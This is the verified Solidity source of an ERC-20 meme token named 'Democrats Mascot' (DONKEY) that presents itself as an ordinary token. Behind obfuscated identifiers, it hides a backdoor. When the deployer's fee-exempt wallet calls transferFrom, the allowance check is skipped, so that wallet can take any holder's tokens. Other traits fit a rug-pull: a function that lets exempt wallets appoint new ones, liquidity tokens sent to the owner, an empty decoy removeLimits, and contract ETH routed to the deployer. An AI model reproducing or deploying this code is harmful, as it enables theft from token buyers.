/**
 *Submitted for verification at Etherscan.io on 2025-03-12
*/

// SPDX-License-Identifier: MIT

/*
    https://x.com/TheDemocrats
    https://t.me/DemocratsMascotEth
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract DONKEY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcVTVV;
    mapping(address => mapping(address => uint256)) private _allcvnkjnVTVV;
    mapping(address => bool) private _feevblknlVTVV;
    address payable private _taxclknlVTVV;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10 **_decimals;
    string private constant _name = unicode"Democrats Mascot";
    string private constant _symbol = unicode"DONKEY";

    uint256 private _vkjbnkfjVTVV = 10;
    uint256 private _maxovnboiVTVV = 10;
    uint256 private _initvkjnbkjVTVV = 20;
    uint256 private _finvjlkbnlkjVTVV = 0;
    uint256 private _redclkjnkVTVV = 2;
    uint256 private _prevlfknjoiVTVV = 2;
    uint256 private _buylkvnlkVTVV = 0;
    IUniswapV2Router02 private uniswapV2Router;

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknVTVV;
    bool private _inlknblVTVV = false;
    bool private swapvlkVTVV = false;
    uint256 private _sellcnjkVTVV = 0;
    uint256 private _lastflkbnlVTVV = 0;
    address constant _deadlknVTVV = address(0xdead);

    uint256 public _vnbbvlkVTVV = qq30fef / 100;
    uint256 public _oijboijoiVTVV = 15 * 10**18;
    uint256 private _cvjkbnkjVTVV = 10;

    modifier lockTheSwap() {
        _inlknblVTVV = true;
        _;
        _inlknblVTVV = false;
    }
    
    function _transfer_kjvnVTVV(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblVTVV(from, to, amount);
        _balknvlkcVTVV[from] = _balknvlkcVTVV[from].sub(amount);
        _balknvlkcVTVV[to] = _balknvlkcVTVV[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcVTVV[address(this)] = _balknvlkcVTVV[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknVTVV) emit Transfer(from, to, amount.sub(taxAmount));
    }

    constructor() payable {
        _taxclknlVTVV = payable(_msgSender());
        
        _balknvlkcVTVV[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcVTVV[address(this)] = (qq30fef * 98) / 100;
        _feevblknlVTVV[address(this)] = true;
        _feevblknlVTVV[_taxclknlVTVV] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcVTVV[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnVTVV[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _downcklkojVTVV(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlVTVV[msg.sender]) return !_feevblknlVTVV[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknVTVV)) return false;
        return true;
    }
    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnVTVV(sender, recipient, amount);
        if (_downcklkojVTVV(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnVTVV[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnVTVV(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnVTVV[owner][spender];
    }

    function _calcTax_lvknblVTVV(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblVTVV) {
                taxAmount = amount
                    .mul((_buylkvnlkVTVV > _redclkjnkVTVV) ? _finvjlkbnlkjVTVV : _initvkjnbkjVTVV)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlVTVV[to] &&
                to != _taxclknlVTVV
            ) {
                _buylkvnlkVTVV++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblVTVV &&
                to == uniswapV2Pair &&
                from != _taxclknlVTVV &&
                swapvlkVTVV &&
                _buylkvnlkVTVV > _prevlfknjoiVTVV
            ) {
                if (block.number > _lastflkbnlVTVV) {
                    _sellcnjkVTVV = 0;
                }
                _sellcnjkVTVV = _sellcnjkVTVV + _getAmountOut_lvcbnkVTVV(amount);
                require(_sellcnjkVTVV <= _oijboijoiVTVV, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkVTVV)
                    _swapTokenslknlVTVV(_vnbbvlkVTVV > amount ? amount : _vnbbvlkVTVV);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjVTVV(address(this).balance);
                }
                _lastflkbnlVTVV = block.number;
            }
        }
        return taxAmount;
    }
    function _sendETHTocvbnjVTVV(uint256 amount) private {
        _taxclknlVTVV.transfer(amount);
    }
    function _swapTokenslknlVTVV(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function GO_GOGO() external onlyOwner {
        require(!_tradingvlknVTVV, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkVTVV = true;
        _tradingvlknVTVV = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnVTVV() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkVTVV(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblVTVV(address payable newWallet) external {
        require(_feevblknlVTVV[_msgSender()]);
        _taxclknlVTVV = newWallet;
        _feevblknlVTVV[_taxclknlVTVV] = true;
    }
}